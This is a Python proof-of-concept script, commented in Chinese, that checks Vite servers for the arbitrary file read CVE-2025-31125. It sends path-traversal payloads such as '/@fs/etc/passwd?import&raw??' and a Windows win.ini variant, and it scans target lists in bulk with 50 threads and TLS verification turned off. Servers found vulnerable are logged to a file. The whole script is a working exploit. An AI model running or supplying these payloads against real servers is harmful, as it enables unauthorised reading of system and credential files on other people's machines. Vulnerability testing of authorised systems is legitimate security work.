import argparse
import requests
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

# 禁用 SSL 警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def banner():
    print("""
 ___  ____  ___  ___   ___   ___    __  
/ __)(_  _)/ __)(__ \ | __) / _ \  /. | 
\__ \ _)(_ \__ \ / _/ |__ \( (_) )(_  _)
(___/(____)(___/(____)(___/ \___/   (_) 
""")
    print("[*] Vite CVE-2025-31125 任意文件读取漏洞检测\n")

def poc(target, os_type="linux"):
    # 根据操作系统选择 payload
    if os_type.lower() == "windows":
        payload = "/@fs/C://windows/win.ini?import&raw??"
        check_str = "[fonts]"  # win.ini 常见内容判断
    else:
        payload = "/@fs/etc/passwd?import&raw??"
        check_str = "root:x"  # /etc/passwd 判断内容

    url = target.rstrip("/") + payload

    try:
        res = requests.get(url, timeout=10, verify=False)
        if res.status_code == 200 and check_str in res.text:
            print(f"[+] {target} 存在漏洞 ({os_type})")
            with open("result.txt", "a", encoding="utf-8") as f:
                f.write(f"{target} ({os_type})\n")
        else:
            print(f"[-] {target} 不存在漏洞 ({os_type})")
    except requests.RequestException as e:
        print(f"[!] {target} 请求异常 -> {e}")

def main():
    banner()
    parser = argparse.ArgumentParser(description="Vite CVE-2025-31125 任意文件读取检测")
    parser.add_argument("-u", "--url", dest="url", type=str, help="目标 URL")
    parser.add_argument("-f", "--file", dest="file", type=str, help="批量 URL 文件")
    parser.add_argument("--os", dest="os_type", type=str, default="linux", choices=["linux", "windows"], help="操作系统类型，默认 linux")
    args = parser.parse_args()

    targets = []
    if args.url and not args.file:
        targets.append(args.url.strip())
    elif args.file and not args.url:
        with open(args.file, "r", encoding="utf-8") as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        print(f"Usage: python {__file__} -u http://target [--os linux|windows]")
        print(f"   or: python {__file__} -f url.txt [--os linux|windows]")
        return

    pool = Pool(50)
    for t in targets:
        pool.apply_async(poc, args=(t, args.os_type))
    pool.close()
    pool.join()

if __name__ == "__main__":
    main()
